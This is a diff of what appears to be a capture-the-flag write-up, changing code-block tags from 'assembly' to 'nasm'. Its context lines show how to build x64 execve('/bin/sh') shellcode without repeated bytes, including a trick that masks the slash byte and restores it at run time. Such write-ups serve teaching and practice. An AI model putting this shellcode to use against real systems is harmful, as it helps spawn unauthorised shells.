@@ -39,7 +39,7 @@ First lets try a **basic x64 shellcode** and see if there are any reapeating byt
 
 We get step 3 and 4  for free since all registers are already zero'd from the start. The rest looks something like this:
 
-```assembly
+```nasm
 68 2f 73 68 00      push   0x0068732f   ; 1. '/sh\x00'
 68 2f 62 69 6e      push   0x6e69622f   ; 1. '/bin'
 48 89 e7            mov    rdi, rsp      ; 2. Put the '/bin//sh' addr in rdi
@@ -51,7 +51,7 @@ b0 3b               mov    al, 0x3b      ; 5. Mov to rax the execve syscall numb
 
 As we can see on the left there are repeated bytes in the first two intructions.
 Having 2 `push`s is not an option since the opcode will be repeated. Lets try and do it with a `mov` intead of a `push` and see if we have better luck.
-```assembly
+```nasm
 c7 04 24 2f 73 68 00    mov    DWORD PTR [rsp], 0x0068732f
 68 2f 62 69 6e          push   0x6e69622f
 48 89 e7                mov    rdi, rsp
@@ -63,7 +63,7 @@ That is better but '/bin/sh\x00' contains two '/' (2f) and that is a problem sin
 Also the byte 0x68 is repeated since it is the opcode of `push` and also the letter `'h'`.
 
 Let's try another version:
-```assembly
+```nasm
 49 bc 2f 62 69 6e 2f    movabs r12,0x68732f6e69622f
 73 68 00
 41 54                   push   r12
@@ -80,7 +80,7 @@ At this point I tried using just `sh` or `bash`, but the execve syscall only wor
 Now the plan is to mask the slash. Instead of putting a slash there directly we want to:
 1. mask `'/'` by sending the value of `'/' - 1`
 2. unmask it by adding `1`, making it a `'/'` again.
-```assembly
+```nasm
 49 bc 2f 62 69 6e 2e    movabs r12,0x68732e6e69622f
 73 68 00
 41 54                   push   r12
